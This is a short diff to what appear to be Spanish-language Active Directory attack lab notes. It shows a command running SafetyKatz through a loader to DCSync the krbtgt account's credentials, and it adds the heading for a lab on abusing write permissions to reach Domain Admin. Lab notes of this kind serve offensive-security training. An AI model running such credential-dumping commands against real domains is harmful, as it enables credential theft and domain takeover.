@@ -1293,4 +1293,6 @@ Y abusaremos de *LDAP* usando
 C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
 ```
 
-
+*LO -17*
+	En este laboratorio vamos a busacar un equipo en el dominio donde tengamos permisos de escritura, y abusar de estos privilegios para acceder a ese equipo como *Domain Admin*
+	
